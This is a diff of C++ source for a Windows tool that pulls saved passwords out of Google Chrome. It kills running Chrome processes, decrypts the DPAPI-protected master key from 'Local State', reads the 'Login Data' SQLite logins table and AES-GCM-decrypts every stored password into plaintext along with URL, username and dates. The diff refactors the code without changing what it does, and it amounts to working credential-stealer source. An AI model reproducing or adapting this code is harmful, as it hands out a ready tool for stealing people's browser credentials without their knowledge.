@@ -1,65 +1,60 @@
 #include "chrome.hxx"
 
 #include "crypt.hxx"
-#include "login.hxx"
 #include "nowide.hxx"
-#include <chrono>
 #include <fstream>
-#include <iostream>
-#include <string>
+#include <vector>
 #include <ShlObj.h>
 #include <windows.h>
-#include <tlhelp32.h>
+#include <TlHelp32.h>
 #include <sqlite3.h>
 #include <wil/resource.h>
 #include <nlohmann/json.hpp>
 
-chrome::chrome() {
+chrome::chrome() {}
+
+std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
     std::filesystem::path base_path = get_base_path();
-    m_key_path    = base_path / "Local State";
+    m_key_path = base_path / "Local State";
     m_logins_path = base_path / "Default" / "Login Data";
 
     if (!(std::filesystem::exists(m_key_path) && std::filesystem::exists(m_logins_path))) {
-        return;
+        return std::unexpected(browser_error::file_not_found);
     }
 
     if (BCryptOpenAlgorithmProvider(&m_aes_alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
-        return;
+        return std::unexpected(browser_error::bcrypt_error);
     }
 
     BCryptSetProperty(m_aes_alg.get(), BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof (BCRYPT_CHAIN_MODE_GCM), 0);
 
-    m_valid = true;
-}
+    ULONG bytes_copied;
+    BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
+    BCryptGetProperty(m_aes_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&auth_tag_lengths,
+                      sizeof (auth_tag_lengths), &bytes_copied, 0);
 
-std::filesystem::path chrome::get_base_path(void) {
-    wil::unique_cotaskmem_string local_appdata_path;
-    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL,
-                         &local_appdata_path);
+    std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
 
-    std::filesystem::path base_path = local_appdata_path.get();
-
-    return base_path / "Google" / "Chrome" / "User Data";
-}
-
-std::vector<login> chrome::get(void) {
-    // can't open database if chrome is running
+    // kill chrome processes to free file locks
     kill();
 
-    std::fstream key_file(m_key_path);
+    std::ifstream key_file(m_key_path);
+
+    // encrypted_key is encrypted with the Windows Data Protection API (DPAPI),
+    // then base64 encoded. this is the AES key with which the password_value
+    // database column fields are encrypted.
 
     std::vector<uint8_t> key_data;
     using json = nlohmann::json;
     try {
         json j = json::parse(key_file);
-        std::string key_data_b64 = j["os_crypt"]["encrypted_key"];
-        key_data = b64_decode(&key_data_b64[0]);
+        key_data = b64_decode(j["os_crypt"]["encrypted_key"]);
     } catch (json::exception &) {
-        std::cerr << "json exception\n";
-        return {};
+        return std::unexpected(browser_error::json_parse_error);
     }
 
+    // key_data[0,4] is the string "DPAPI", which must be removed
     key_data.erase(key_data.begin(), key_data.begin() + 5);
     key_data = dpapi_decrypt(key_data);
     wil::unique_bcrypt_key key = import_key_data(m_aes_alg, key_data);
@@ -70,44 +65,40 @@ std::vector<login> chrome::get(void) {
 
     unique_sqlite3 db;
     if (sqlite3_open(m_logins_path.string().c_str(), &db) != SQLITE_OK) {
-        std::cerr << "error opening databse\n";
-        return {};
+        return std::unexpected(browser_error::sqlite_error);
     }
 
-    unique_sqlite3_stmt statement;
+    unique_sqlite3_stmt stmt;
     if (sqlite3_prepare_v2(db.get(),
-            "SELECT origin_url, date_created, username_value, password_value FROM logins",
-            -1, &statement, NULL) != SQLITE_OK) {
-        std::cerr << "error preparing statement\n";
-        return {};
+            "SELECT origin_url, date_created, date_last_used, username_value, password_value FROM logins",
+            -1, &stmt, NULL) != SQLITE_OK) {
+        return std::unexpected(browser_error::sqlite_error);
     }
 
     std::vector<login> logins;
 
-    ULONG bytes_copied;
-    BCRYPT_AUTH_TAG_LENGTHS_STRUCT auth_tag_lengths;
-    BCryptGetProperty(m_aes_alg.get(), BCRYPT_AUTH_TAG_LENGTH, (PUCHAR)&auth_tag_lengths, sizeof (auth_tag_lengths), &bytes_copied, 0);
-
     int step_ret = 0;
-    while ((step_ret = sqlite3_step(statement.get())) == SQLITE_ROW) {
-        const std::string   db_origin_url = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 0));
-        const sqlite3_int64 db_date_created = sqlite3_column_int64(statement.get(), 1);
-        const std::string   db_username_value = reinterpret_cast<const char *>(sqlite3_column_text(statement.get(), 2));
-        const uint8_t      *db_password_value = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(statement.get(), 3));
-        const size_t        db_password_value_size = sqlite3_column_bytes(statement.get(), 3);
+    while ((step_ret = sqlite3_step(stmt.get())) == SQLITE_ROW) {
+        // TODO: tidy
+        const std::string    db_origin_url          = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 0));
+        const sqlite3_int64  db_date_created        = sqlite3_column_int64(stmt.get(), 1);
+        const sqlite3_int64  db_date_last_used      = sqlite3_column_int64(stmt.get(), 2);
+        const std::string    db_username_value      = reinterpret_cast<const char *>(sqlite3_column_text(stmt.get(), 3));
+        const uint8_t       *db_password_value      = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt.get(), 4));
+        const size_t         db_password_value_size = sqlite3_column_bytes(stmt.get(), 4);
 
-        // first 3 bytes of password_value are kEncryptionVersionPrefix ("v10")
+        // db_password_value is encrypted with AES
+
+        // db_password_value[0,2] is the string "v10" (kEncryptionVersionPrefix), which is skipped
         std::vector<uint8_t> nonce(db_password_value + 3, db_password_value + 15),
                              ciphertext(db_password_value + 15, db_password_value + db_password_value_size);
-
-        std::vector<uint8_t> auth_tag(auth_tag_lengths.dwMinLength);
 
         BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
         BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
         auth_info.pbNonce = nonce.data();
         auth_info.cbNonce = (ULONG)nonce.size();
-        auth_info.pbTag = auth_tag.data();
-        auth_info.cbTag = (ULONG)auth_tag.size();
+        auth_info.pbTag   = auth_tag.data();
+        auth_info.cbTag   = (ULONG)auth_tag.size();
 
         std::string password_plaintext(ciphertext.size(), '\0');
         BCryptDecrypt(
@@ -120,28 +111,45 @@ std::vector<login> chrome::get(void) {
                 0);
         password_plaintext.resize(password_plaintext.size() - 16);
 
+        using namespace std::chrono;
+
         // difference between UNIX epoch (1970-01-01 00:00:00 UTC) and windows FILETIME
         // epoch (1601-01-01 00:00:00 UTC)
-        auto epoch_offset = std::chrono::seconds{11644473600LL};
-        std::chrono::system_clock::time_point date_created{std::chrono::microseconds{db_date_created}
+        auto epoch_offset = seconds{11644473600LL};
+
+        system_clock::time_point date_created{microseconds{db_date_created}
                                                            - epoch_offset};
+        system_clock::time_point date_last_used{};
+        if (db_date_last_used != 0) {
+            date_last_used = {microseconds{db_date_last_used} - epoch_offset};
+        }
 
         login l;
-        l.url = db_origin_url;
-        l.username = db_username_value;
-        l.password = password_plaintext;
-        l.date_created = date_created;
+        l.url            = db_origin_url;
+        l.username       = db_username_value;
+        l.password       = password_plaintext;
+        l.date_created   = date_created;
+        l.date_last_used = date_last_used;
         logins.emplace_back(l);
     }
     if (step_ret != SQLITE_DONE) {
-        std::cerr << "error reading database\n";
-        return {};
+        return std::unexpected(browser_error::sqlite_error);
     }
 
     return logins;
 }
 
-void chrome::kill(void) const {
+std::filesystem::path chrome::get_base_path(void) {
+    wil::unique_cotaskmem_string local_appdata_path;
+    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL,
+                         &local_appdata_path);
+
+    std::filesystem::path base_path = local_appdata_path.get();
+
+    return base_path / "Google" / "Chrome" / "User Data";
+}
+
+void chrome::kill(void) {
     PROCESSENTRY32W entry;
     entry.dwSize = sizeof (PROCESSENTRY32W);
 
@@ -157,26 +165,3 @@ void chrome::kill(void) const {
         }
     } while (Process32NextW(snapshot.get(), &entry));
 }
-
-/*
-std::string chrome::format_time(sqlite3_int64 t) {
-    // time since epoch is stored by chrome as microseconds but by FILETIME as 100-nanosecond intervals
-    // https://docs.microsoft.com/en-us/windows/win32/sysinfo/file-times
-    // https://source.chromium.org/chromium/chromium/src/+/main:base/time/time.h;l=505;drc=721e6d70189ce1350f8ff733a02c98b9bc8e8251
-    t *= 10;
-
-    // FILETIME describes a 64-bit value
-    FILETIME ft;
-    ft.dwHighDateTime = (t & 0xFFFFFFFF00000000) >> 32; // 32 most significant bits
-    ft.dwLowDateTime = t & 0xFFFFFFFF; // 32 least significant bits
-
-    SYSTEMTIME st;
-    FileTimeToSystemTime(&ft, &st);
-
-    const char *format = "%d-%02d-%02d %02d:%02d:%02d.%03d UTC";
-    const int size = std::snprintf(nullptr, 0, format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
-    std::string ret(size + 1, '\0');
-    std::sprintf(&ret[0], format, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
-    return ret;
-}
-*/
